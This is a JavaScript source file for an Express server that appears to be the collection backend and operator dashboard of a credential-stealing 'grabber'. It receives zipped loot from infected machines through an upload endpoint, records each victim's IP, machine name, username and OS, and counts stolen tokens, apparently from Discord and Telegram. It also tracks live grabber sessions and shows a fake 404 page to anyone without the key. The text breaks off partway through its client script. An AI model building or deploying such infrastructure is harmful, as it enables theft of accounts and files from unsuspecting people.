const express = require("express");
const multer = require("multer");
const crypto = require("crypto");
const { Pool } = require("pg");
const AdmZip = require("adm-zip");

const app = express();
const PORT = process.env.PORT || 8080;
const API_KEY = process.env.API_KEY || "changeme";

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes("localhost")
    ? { rejectUnauthorized: false }
    : false,
});

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).send(page404());
  next();
}

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS grabs (
      id TEXT PRIMARY KEY,
      filename TEXT NOT NULL,
      filedata BYTEA NOT NULL,
      filesize BIGINT NOT NULL,
      ip TEXT DEFAULT '',
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      os TEXT DEFAULT '',
      arch TEXT DEFAULT '',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  // add columns if upgrading from older schema
  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS token_count INT DEFAULT 0`);
  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS src TEXT DEFAULT 'dc'`);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      val TEXT DEFAULT '',
      bin BYTEA
    )
  `);
  // session ping tracking
  await pool.query(`
    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY,
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      ip TEXT DEFAULT '',
      status TEXT DEFAULT 'connected',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
}

// One zip parse per upload — returns token count + source type
function parseZipMeta(buf) {
  try {
    const zip = new AdmZip(buf);
    let tokenCount = 0, src = "dc";
    for (const e of zip.getEntries()) {
      if (e.entryName === "m.json") {
        try { src = JSON.parse(e.getData().toString("utf8")).src || "dc"; } catch {}
      }
      if (e.entryName.endsWith("/tokens.json")) {
        try { const a = JSON.parse(e.getData().toString("utf8")); if (Array.isArray(a)) tokenCount += a.length; } catch {}
      }
    }
    return { tokenCount, src };
  } catch { return { tokenCount: 0, src: "dc" }; }
}

initDb().catch(e => console.error("[!] db init failed:", e.message));

// serve stored background image (no auth — it's just wallpaper)
app.get("/bg", async (req, res) => {
  try {
    const { rows } = await pool.query(`SELECT val, bin FROM settings WHERE key='background_image'`);
    if (!rows.length || !rows[0].bin) return res.status(404).end();
    res.setHeader("Content-Type", rows[0].val || "image/jpeg");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(rows[0].bin);
  } catch { res.status(500).end(); }
});

// save background + extracted theme colors
app.post("/theme", checkKey, upload.single("img"), async (req, res) => {
  try {
    if (req.file) {
      await pool.query(
        `INSERT INTO settings (key,val,bin) VALUES ('background_image',$1,$2)
         ON CONFLICT (key) DO UPDATE SET val=$1,bin=$2`,
        [req.file.mimetype, req.file.buffer]
      );
    }
    if (req.body && req.body.colors) {
      await pool.query(
        `INSERT INTO settings (key,val) VALUES ('theme_colors',$1)
         ON CONFLICT (key) DO UPDATE SET val=$1`,
        [req.body.colors]
      );
    }
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

// session ping — called by grabber at: connected, uploading, done, failed
app.post("/ping", checkKey, async (req, res) => {
  try {
    const sid = req.query.sid || crypto.randomBytes(4).toString("hex");
    const ip  = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const status = (req.query.status || "connected").slice(0, 20);
    await pool.query(`
      INSERT INTO sessions (id, machine, username, ip, status, created_at, updated_at)
      VALUES ($1,$2,$3,$4,$5,NOW(),NOW())
      ON CONFLICT (id) DO UPDATE SET status=$5, updated_at=NOW()
    `, [sid, req.query.m||"", req.query.u||"", ip, status]);
    res.json({ ok:1, sid });
  } catch(err) { res.status(500).json({ e: err.message }); }
});

// clear background + theme
app.post("/theme/reset", checkKey, async (req, res) => {
  try {
    await pool.query(`DELETE FROM settings WHERE key IN ('background_image','theme_colors')`);
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

function fmtSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

function timeAgo(dt) {
  const ms = Date.now() - new Date(dt).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  return d + "d ago";
}

const fmtTime = dt => new Date(dt).toISOString().replace("T", " ").slice(0, 19);

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function osIcon(os) {
  if (!os) return "?";
  const l = os.toLowerCase();
  if (l.includes("windows 10")) return "W10";
  if (l.includes("windows 11")) return "W11";
  if (l.includes("windows")) return "WIN";
  if (l.includes("linux")) return "LNX";
  if (l.includes("mac") || l.includes("darwin")) return "MAC";
  return "SYS";
}

function page404() {
  return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
}

app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ e: 1 });
  try {
    const id = crypto.randomBytes(4).toString("hex");
    const ts = Date.now();
    const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const { tokenCount, src } = parseZipMeta(req.file.buffer);
    await pool.query(
      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch, token_count, src)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
      [id, filename, req.file.buffer, req.file.size,
       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || "",
       tokenCount, src]
    );
    res.json({ e: 0, tc: tokenCount });
  } catch (err) {
    console.error("[!] upload error:", err.message);
    res.status(500).json({ e: 2 });
  }
});

app.get("/", checkKey, async (req, res) => {
  try {
    const [grabsRes, settingsRes, sessRes] = await Promise.all([
      pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at, COALESCE(token_count,0) as token_count, COALESCE(src,'dc') as src FROM grabs ORDER BY created_at DESC`),
      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`),
      pool.query(`SELECT id, machine, username, ip, status, updated_at FROM sessions WHERE updated_at > NOW() - INTERVAL '24 hours' ORDER BY updated_at DESC LIMIT 30`)
    ]);
    const rows = grabsRes.rows;
    const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
    const k = encodeURIComponent(req.query.key);
    const entries = rows.map(r => ({
      id: r.id, f: r.filename, s: parseInt(r.filesize),
      t: r.created_at, ip: r.ip, m: r.machine,
      u: r.username, o: r.os, a: r.arch,
      tc: parseInt(r.token_count || 0), src: r.src || "dc",
    }));
    const smap = {};
    settingsRes.rows.forEach(r => { smap[r.key] = r; });
    const hasBg = !!(smap.background_image && smap.background_image.has_bin);
    let theme = null;
    if (smap.theme_colors && smap.theme_colors.val) {
      try { theme = JSON.parse(smap.theme_colors.val); } catch {}
    }
    const sessions = sessRes.rows;
    res.send(renderPage(entries, totalSize, k, { hasBg, theme, sessions }));
  } catch (err) {
    console.error("[!] dashboard error:", err.message);
    res.status(500).send("db error");
  }
});

app.get("/dl/:id", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT filename, filedata FROM grabs WHERE id = $1`, [req.params.id]
    );
    if (!rows.length) return res.status(404).send(page404());
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename=${rows[0].filename}`);
    res.send(rows[0].filedata);
  } catch (err) {
    res.status(500).send("error");
  }
});

app.post("/rm/:id", checkKey, async (req, res) => {
  try { await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]); } catch {}
  res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
});

function renderPage(entries, totalSize, k, { hasBg = false, theme = null, sessions = [] } = {}) {
  const uniqueIps = new Set(entries.map(e => e.ip)).size;
  const now = Date.now();
  const isFresh = (t) => (now - new Date(t).getTime()) < 5 * 60 * 1000;
  const tableRows = entries.map((e, i) => {
    const osTag = osIcon(e.o);
    const isWin = (e.o || "").toLowerCase().includes("windows");
    const fresh = isFresh(e.t);
    const hasTok = e.tc > 0;
    const srcTag = e.src === "tg" ? "TG" : "DC";
    const srcCls = e.src === "tg" ? "tag-b" : "tag-g";
    return `<tr class="${fresh ? "fresh " : ""}row-${Math.min(i,15)}">
      <td class="mono muted ind">${esc(e.id)}</td>
      <td><span class="tag ${srcCls}">${srcTag}</span>&nbsp;<span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
      <td class="mono">${esc(e.m)}${e.u ? `<span class='muted'>&nbsp;\\&nbsp;${esc(e.u)}</span>` : ""}</td>
      <td class="mono muted">${esc(e.a)}</td>
      <td class="mono muted">${esc(e.ip)}</td>
      <td class="mono">${fmtSize(e.s || 0)}</td>
      <td class="mono ${hasTok ? "tok-yes" : "tok-no"}">${hasTok ? `<span class="tok-badge">&#9670; ${e.tc}</span>` : '<span class="muted">—</span>'}</td>
      <td><div class="ts">${fmtTime(e.t)}</div><div class="accent">${timeAgo(e.t)}</div></td>
      <td class="actions">
        <a class="btn btn-t" href="/dc/${esc(e.id)}?key=${k}" title="tokens">&#9670;</a>
        <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}" title="download">&#8615;</a>
        <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove?')">
          <button class="btn btn-d" type="submit">&#10005;</button>
        </form>
      </td>
    </tr>`;
  }).join("");

  const themeOverride = theme
    ? `<style>:root{--accent:${esc(theme.accent)};--accent-dim:${esc(theme.accent)}26;--glow:${esc(theme.glow)}}</style>`
    : '';
  const bgTs = Date.now();

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --void:#03030A;
  --glass:rgba(10,8,24,0.62);
  --glass-b:rgba(255,255,255,0.09);
  --text:#CCC8E8;
  --muted:#504E6A;
  --accent:#B06EFF;
  --accent-dim:#B06EFF22;
  --glow:#7C3AED;
  --green:#4ADE80;
  --red:#F87171;
  --blue:#60A5FA;
  --sans:'Space Grotesk',system-ui,sans-serif;
  --mono:'JetBrains Mono','Cascadia Code','Fira Code',monospace
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background-color:var(--void);
  ${hasBg ? `background-image:url('/bg?t=${bgTs}');background-size:cover;background-attachment:fixed;background-position:center;` : ''}
  color:var(--text);font-family:var(--sans);font-size:14px;
  min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden
}

/* dim overlay */
.dim-layer{position:fixed;inset:0;background:rgba(2,2,10,${hasBg?'0.58':'0.0'});pointer-events:none;z-index:1}

/* aurora — animated colour blobs behind glass */
.aurora{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.blob{position:absolute;border-radius:50%;filter:blur(90px);opacity:${hasBg?'0.08':'0.18'}}
.b1{width:700px;height:700px;background:var(--accent);top:-180px;left:-120px;animation:float1 22s ease-in-out infinite}
.b2{width:600px;height:600px;background:var(--glow);bottom:-140px;right:-100px;animation:float2 28s ease-in-out infinite}
.b3{width:500px;height:500px;background:#3B82F6;top:40%;left:50%;transform:translate(-50%,-50%);animation:float3 19s ease-in-out infinite}
@keyframes float1{0%,100%{transform:translate(0,0)}33%{transform:translate(70px,50px)}66%{transform:translate(-40px,70px)}}
@keyframes float2{0%,100%{transform:translate(0,0)}33%{transform:translate(-60px,-40px)}66%{transform:translate(40px,-70px)}}
@keyframes float3{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.35)}}

.shell{position:relative;z-index:2;max-width:1440px;margin:0 auto;padding:24px}

/* progress bar on load */
.load-bar{
  position:fixed;top:0;left:0;height:2px;
  background:linear-gradient(90deg,var(--accent),var(--blue));
  z-index:999;animation:loadBar .9s cubic-bezier(0.4,0,0.2,1) forwards
}
@keyframes loadBar{from{width:0}to{width:100%}}

/* top bar */
.top{
  display:flex;align-items:center;justify-content:space-between;
  padding:16px 22px;
  background:var(--glass);
  backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);
  border:1px solid var(--glass-b);border-radius:16px;margin-bottom:20px;
  animation:slideDown .5s cubic-bezier(0.34,1.3,0.64,1) both
}
@keyframes slideDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:none}}
.logo{display:flex;align-items:center;gap:14px}
.dot{
  width:9px;height:9px;border-radius:50%;
  background:var(--green);flex-shrink:0;
  animation:ripple 2.2s ease-out infinite
}
@keyframes ripple{
  0%{box-shadow:0 0 0 0 rgba(74,222,128,0.7),0 0 0 0 rgba(74,222,128,0.3)}
  60%{box-shadow:0 0 0 7px rgba(74,222,128,0),0 0 0 14px rgba(74,222,128,0)}
  100%{box-shadow:0 0 0 0 rgba(74,222,128,0),0 0 0 0 rgba(74,222,128,0)}
}
.logo h1{
  font-family:var(--sans);font-size:15px;font-weight:700;
  color:#fff;letter-spacing:6px;text-transform:uppercase
}
.cursor{color:var(--accent);animation:cur 1.1s step-end infinite}
@keyframes cur{0%,100%{opacity:1}50%{opacity:0}}
.top-r{display:flex;align-items:center;gap:12px}
.live-tag{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:1px}

/* stat cards */
.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:20px}
.card{
  background:var(--glass);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border:1px solid var(--glass-b);border-radius:16px;
  padding:26px 22px;position:relative;overflow:hidden;cursor:default;
  transition:box-shadow .25s,border-color .25s,transform .2s;
  animation:cardIn .55s cubic-bezier(0.34,1.3,0.64,1) both
}
@keyframes cardIn{from{opacity:0;transform:translateY(22px) scale(0.96)}to{opacity:1;transform:none}}
.cards .card:nth-child(1){animation-delay:60ms}
.cards .card:nth-child(2){animation-delay:130ms}
.cards .card:nth-child(3){animation-delay:200ms}
.cards .card:nth-child(4){animation-delay:270ms}
.card:hover{
  box-shadow:0 0 40px rgba(176,110,255,0.18),0 8px 32px rgba(0,0,0,0.5);
  border-color:rgba(176,110,255,0.22);
  transform:translateY(-2px)
}
.card::before{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,var(--accent),var(--blue) 60%,transparent)
}
.card::after{
  content:'';position:absolute;top:-60%;left:-80%;width:55%;height:220%;
  background:linear-gradient(105deg,transparent 35%,rgba(255,255,255,0.07) 50%,transparent 65%);
  transform:skewX(-18deg);pointer-events:none;opacity:0
}
.card:hover::after{animation:sweep .6s ease-out forwards}
@keyframes sweep{0%{left:-80%;opacity:1}100%{left:130%;opacity:1}}
.card .label{
  font-family:var(--mono);font-size:10px;color:var(--muted);
  text-transform:uppercase;letter-spacing:2.5px;margin-bottom:12px
}
.card .value{
  font-family:var(--sans);font-size:44px;font-weight:700;
  color:#F2EEFF;line-height:1;letter-spacing:-2px
}
.card .value.sm{font-size:18px;font-weight:600;letter-spacing:0}

/* table */
.table-wrap{
  background:var(--glass);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border:1px solid var(--glass-b);border-radius:16px;overflow:hidden;
  animation:fadeUp .4s ease .35s both
}
table{width:100%;border-collapse:collapse}
thead th{
  background:rgba(3,3,14,0.8);
  font-family:var(--mono);color:var(--muted);
  font-size:10px;text-transform:uppercase;letter-spacing:2px;
  padding:14px 16px;text-align:left;font-weight:400;
  border-bottom:1px solid rgba(255,255,255,0.04);white-space:nowrap
}
tbody td{
  padding:14px 16px;
  border-bottom:1px solid rgba(255,255,255,0.028);
  vertical-align:middle;transition:background .15s
}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover td{background:rgba(255,255,255,0.03)}
.ind{border-left:2px solid transparent;transition:border-color .2s;padding-left:14px}
tbody tr:hover .ind{border-left-color:var(--accent)}
tbody tr.fresh .ind{border-left-color:var(--green)}

/* staggered row entrance */
tbody tr{animation:fadeUp .35s ease both}
@keyframes fadeUp{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
${Array.from({length:16},(_,i)=>`.row-${i}{animation-delay:${350+i*40}ms}`).join('')}

/* fresh pulse */
tbody tr.fresh{animation:fadeUp .35s ease both,freshGlow 1.5s ease .4s 3}
@keyframes freshGlow{0%,100%{background:transparent}50%{background:rgba(74,222,128,0.07)}}

.mono{font-family:var(--mono);font-size:12px}
.muted{color:var(--muted)}
.accent{font-family:var(--mono);font-size:11px;color:var(--accent)}
.ts{font-family:var(--mono);font-size:11px;color:var(--muted)}
.tag{
  display:inline-block;padding:4px 10px;border-radius:6px;
  font-size:10px;font-weight:700;letter-spacing:1px;font-family:var(--mono)
}
.tag-g{background:rgba(74,222,128,0.1);color:var(--green)}
.tag-b{background:rgba(176,110,255,0.13);color:var(--accent)}
.actions{white-space:nowrap}
.btn{
  display:inline-flex;align-items:center;justify-content:center;
  width:32px;height:32px;border-radius:8px;
  border:1px solid rgba(255,255,255,0.07);
  background:rgba(255,255,255,0.04);
  color:var(--muted);font-size:14px;cursor:pointer;
  text-decoration:none;transition:all .18s;font-family:var(--mono)
}
.btn:hover{border-color:rgba(255,255,255,0.12);color:var(--text);transform:scale(1.08)}
.btn-t:hover{background:var(--accent-dim);color:var(--accent);border-color:rgba(176,110,255,0.35);box-shadow:0 0 12px rgba(176,110,255,0.2)}
.btn-p:hover{background:rgba(96,165,250,0.1);color:var(--blue);border-color:rgba(96,165,250,0.35)}
.btn-d:hover{background:rgba(248,113,113,0.1);color:var(--red);border-color:rgba(248,113,113,0.35)}
.gear-btn{font-size:16px;transition:color .2s,transform .45s,border-color .2s,box-shadow .2s}
.gear-btn:hover{color:var(--accent);border-color:rgba(176,110,255,0.35);transform:rotate(75deg);box-shadow:0 0 12px rgba(176,110,255,0.25)}
.tok-badge{
  display:inline-flex;align-items:center;gap:5px;
  font-family:var(--mono);font-size:11px;font-weight:600;
  color:var(--green);
  background:rgba(74,222,128,0.08);
  padding:3px 10px;border-radius:6px;
  border:1px solid rgba(74,222,128,0.18)
}
.tok-no .muted{font-size:11px}

/* connection feed */
.conn-wrap{
  background:var(--glass);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border:1px solid var(--glass-b);border-radius:16px;
  margin-bottom:16px;overflow:hidden;
  animation:fadeUp .4s ease .25s both
}
.conn-header{
  display:flex;align-items:center;justify-content:space-between;
  padding:13px 18px;
  border-bottom:1px solid rgba(255,255,255,0.04);
  background:rgba(3,3,14,0.5)
}
.conn-title{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
.conn-count{font-family:var(--mono);font-size:10px;color:var(--accent)}
.conn-list{padding:6px 0}
.conn-row{
  display:flex;align-items:center;gap:14px;
  padding:10px 18px;
  border-bottom:1px solid rgba(255,255,255,0.025);
  transition:background .15s
}
.conn-row:last-child{border-bottom:none}
.conn-row:hover{background:rgba(255,255,255,0.025)}
.conn-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.s-connected .conn-dot{background:#FBBF24;box-shadow:0 0 6px #FBBF2466;animation:pulse-y 1.6s ease-in-out infinite}
.s-uploading .conn-dot{background:var(--blue);box-shadow:0 0 6px rgba(96,165,250,0.5);animation:pulse-b 1s ease-in-out infinite}
.s-done .conn-dot{background:var(--green);box-shadow:0 0 6px rgba(74,222,128,0.4)}
.s-failed .conn-dot{background:var(--red);box-shadow:0 0 6px rgba(248,113,113,0.4)}
@keyframes pulse-y{0%,100%{opacity:1}50%{opacity:.35}}
@keyframes pulse-b{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(0.7)}}
.conn-machine{font-family:var(--mono);font-size:12px;color:var(--text);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.conn-machine .muted{color:var(--muted)}
.conn-ip{font-family:var(--mono);font-size:11px;color:var(--muted);flex-shrink:0}
.conn-status{
  font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:1px;
  padding:3px 10px;border-radius:6px;flex-shrink:0;text-transform:uppercase
}
.s-connected .conn-status{background:rgba(251,191,36,0.1);color:#FBBF24;border:1px solid rgba(251,191,36,0.2)}
.s-uploading .conn-status{background:rgba(96,165,250,0.1);color:var(--blue);border:1px solid rgba(96,165,250,0.2)}
.s-done .conn-status{background:rgba(74,222,128,0.08);color:var(--green);border:1px solid rgba(74,222,128,0.18)}
.s-failed .conn-status{background:rgba(248,113,113,0.08);color:var(--red);border:1px solid rgba(248,113,113,0.18)}
.conn-time{font-family:var(--mono);font-size:10px;color:var(--muted);flex-shrink:0}
.empty{text-align:center;padding:90px 20px;color:var(--muted);animation:fadeUp .5s ease .2s both}
.empty .icon{font-size:34px;margin-bottom:16px;opacity:.2}
.empty p{font-family:var(--mono);font-size:12px;letter-spacing:2px}
.foot{text-align:center;padding:30px;font-family:var(--mono);color:rgba(255,255,255,0.04);font-size:9px;letter-spacing:4px}

/* drawer */
.overlay{
  position:fixed;inset:0;background:rgba(0,0,0,0.55);
  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
  z-index:100;opacity:0;pointer-events:none;transition:opacity .28s
}
.overlay.open{opacity:1;pointer-events:all}
.drawer{
  position:fixed;top:0;right:0;bottom:0;width:330px;
  background:rgba(4,3,14,0.98);
  backdrop-filter:blur(36px);-webkit-backdrop-filter:blur(36px);
  border-left:1px solid var(--glass-b);
  padding:26px 22px;
  transform:translateX(100%);
  transition:transform .35s cubic-bezier(0.4,0,0.2,1);
  z-index:101;overflow-y:auto
}
.drawer.open{transform:translateX(0)}
.drawer-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:28px}
.drawer-title{font-family:var(--mono);color:var(--accent);letter-spacing:3px;font-size:10px;text-transform:uppercase}
.sec-label{font-family:var(--mono);font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:2px;margin:20px 0 9px}
.drop-zone{
  border:1px dashed rgba(255,255,255,0.1);border-radius:12px;
  padding:26px 16px;text-align:center;cursor:pointer;
  transition:border-color .2s,background .2s,box-shadow .2s;
  display:flex;flex-direction:column;align-items:center;
  justify-content:center;gap:8px;min-height:92px
}
.drop-zone:hover,.drop-zone.drag{
  border-color:var(--accent);background:var(--accent-dim);
  box-shadow:0 0 20px rgba(176,110,255,0.1)
}
.drop-text{font-family:var(--mono);font-size:10px;color:var(--muted)}
#preview-img{max-width:100%;border-radius:10px;display:none;margin-top:10px}
.swatches{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
.swatch{display:flex;align-items:center;gap:7px}
.swatch-dot{width:22px;height:22px;border-radius:7px;border:1px solid rgba(255,255,255,0.08);flex-shrink:0}
.drawer-actions{display:flex;gap:8px;margin-top:22px;align-items:center}
.btn-apply{
  width:auto;padding:0 16px;height:36px;
  font-family:var(--mono);font-size:9px;letter-spacing:2px;
  background:var(--accent-dim);color:var(--accent);
  border-color:rgba(176,110,255,0.3)
}
.btn-apply:disabled{opacity:.3;cursor:not-allowed}
.btn-apply:not(:disabled):hover{background:rgba(176,110,255,0.22);box-shadow:0 0 16px rgba(176,110,255,0.2)}
.drawer-actions .btn-apply{flex:1}
.drawer-actions .btn-d{width:36px;height:36px;flex-shrink:0}
#upload-status{margin-top:10px;font-family:var(--mono);font-size:9px;color:var(--muted);min-height:14px}
.bg-badge{
  font-family:var(--mono);font-size:9px;color:var(--green);
  margin-top:6px;padding:8px 12px;
  background:rgba(74,222,128,0.07);border-radius:8px;
  border:1px solid rgba(74,222,128,0.14)
}

@media(max-width:900px){.cards{grid-template-columns:repeat(2,1fr)}}
@media(max-width:768px){
  table{font-size:12px}td,th{padding:10px 12px}
  .shell{padding:14px}.drawer{width:100%}
  .card .value{font-size:34px}
}
@media(max-width:480px){.cards{grid-template-columns:1fr}}
@media(prefers-reduced-motion:reduce){
  .aurora,.blob{display:none}
  .card,.table-wrap,.top{animation:none}
  tbody tr{animation:none}
  tbody tr.fresh{animation:none}
  .card::after,.card:hover::after{animation:none}
}
</style>
${themeOverride}
</head>
<body>
<div class="load-bar"></div>
<div class="aurora" aria-hidden="true">
  <div class="blob b1"></div>
  <div class="blob b2"></div>
  <div class="blob b3"></div>
</div>
<div class="dim-layer"></div>

<div class="shell">
  <div class="top">
    <div class="logo">
      <div class="dot"></div>
      <h1>NEXUS<span class="cursor">_</span></h1>
    </div>
    <div class="top-r">
      <span class="live-tag">LIVE &middot; 30S</span>
      <button class="btn gear-btn" id="gear" title="Theme">&#9881;</button>
    </div>
  </div>

  <div class="cards">
    <div class="card"><div class="label">Entries</div><div class="value" data-count="${entries.length}">${entries.length}</div></div>
    <div class="card"><div class="label">Volume</div><div class="value">${fmtSize(totalSize)}</div></div>
    <div class="card"><div class="label">Sources</div><div class="value" data-count="${uniqueIps}">${uniqueIps}</div></div>
    <div class="card"><div class="label">Latest</div><div class="value sm">${entries.length ? timeAgo(entries[0].t) : "—"}</div></div>
  </div>

  ${sessions.length ? `
  <div class="conn-wrap">
    <div class="conn-header">
      <span class="conn-title">&#9671;&nbsp; Connection Feed</span>
      <span class="conn-count">${sessions.length} session${sessions.length !== 1 ? 's' : ''} &middot; last 24h</span>
    </div>
    <div class="conn-list">
      ${sessions.map(s => {
        const sc = ['connected','uploading','done','failed'].includes(s.status) ? s.status : 'connected';
        const label = sc === 'connected' ? 'CONNECTED' : sc === 'uploading' ? 'UPLOADING…' : sc === 'done' ? 'DONE' : 'FAILED';
        return `<div class="conn-row s-${sc}">
          <div class="conn-dot"></div>
          <div class="conn-machine">${esc(s.machine)}${s.username ? `<span class="muted"> \\ ${esc(s.username)}</span>` : ''}</div>
          <div class="conn-ip">${esc(s.ip || '').split(',')[0].trim()}</div>
          <div class="conn-status">${label}</div>
          <div class="conn-time">${timeAgo(s.updated_at)}</div>
        </div>`;
      }).join('')}
    </div>
  </div>` : ''}

  ${entries.length
    ? `<div class="table-wrap"><table>
        <thead><tr>
          <th>ID</th><th>SRC / SYS</th><th>HOST</th><th>ARCH</th>
          <th>ORIGIN</th><th>SIZE</th><th>TOKENS</th><th>RECEIVED</th><th></th>
        </tr></thead>
        <tbody>${tableRows}</tbody>
      </table></div>`
    : `<div class="empty"><div class="icon">&#9673;</div><p>NO ENTRIES YET</p></div>`}

  <div class="foot">NEXUS &middot; V6</div>
</div>

<div class="overlay" id="overlay"></div>
<div class="drawer" id="drawer">
  <div class="drawer-head">
    <span class="drawer-title">Theme</span>
    <button class="btn" id="drawer-close">&#10005;</button>
  </div>
  ${hasBg ? '<div class="bg-badge">&#10003;&nbsp; Background active — all visitors see this</div>' : ''}
  <div class="sec-label">Background Image</div>
  <div class="drop-zone" id="dropzone">
    <input type="file" id="bg-file" accept="image/*" style="display:none">
    <span class="drop-text" id="drop-text">Click or drop image here</span>
    <img id="preview-img" alt="">
  </div>
  <div id="color-swatches" style="display:none">
    <div class="sec-label">Auto-detected Colors</div>
    <div class="swatches" id="swatches"></div>
  </div>
  <div class="drawer-actions">
    <button class="btn btn-apply" id="apply-btn" disabled>APPLY</button>
    ${hasBg ? '<button class="btn btn-d" id="reset-btn" title="Remove">&#10005;</button>' : ''}
  </div>
  <div id="upload-status"></div>
</div>

<script>
(function(){
  /* count-up animation */
  document.querySelectorAll('[data-count]').forEach(function(el){
    var target=parseInt(el.getAttribute('data-count'),10);
    if(!target||target<2)return;
    var start=null,dur=900;
    function step(ts){
      if(!start)start=ts;
      var p=Math.min((ts-start)/dur,1);
      var ease=1-Math.pow(1-p,3);
      el.textContent=Math.round(ease*target);
      if(p<1)requestAnimationFrame(step);
      else el.textContent=target;
    }
    requestAnimationFrame(step);
  });

  var K='${k}';
  var gear=document.getElementById('gear'),
      drawer=document.getElementById('drawer'),
      overlay=document.getElementById('overlay'),
      closeBtn=document.getElementById('drawer-close'),
      fileInput=document.getElementById('bg-file'),
      dropzone=document.getElementById('dropzone'),
      previewImg=document.getElementById('preview-img'),
      applyBtn=document.getElementById('apply-btn'),
      resetBtn=document.getElementById('reset-btn'),
      statusEl=document.getElementById('upload-status'),
      swatchesEl=document.getElementById('swatches'),
      swatchesWrap=document.getElementById('color-swatches');
  var selectedFile=null,colors=null;

  function openDrawer(){drawer.classList.add('open');overlay.classList.add('open')}
  function closeDrawer(){drawer.classList.remove('open');overlay.classList.remove('open')}
  gear.addEventListener('click',openDrawer);
  closeBtn.addEventListener('click',closeDrawer);
  overlay.addEventListener('click',closeDrawer);
  document.addEventListener('keydown',function(e){if(e.key==='Escape')closeDrawer()});

  dropzone.addEventListener('click',function(){fileInput.click()});
  dropzone.addEventListener('dragover',function(e){e.preventDefault();dropzone.classList.add('drag')});
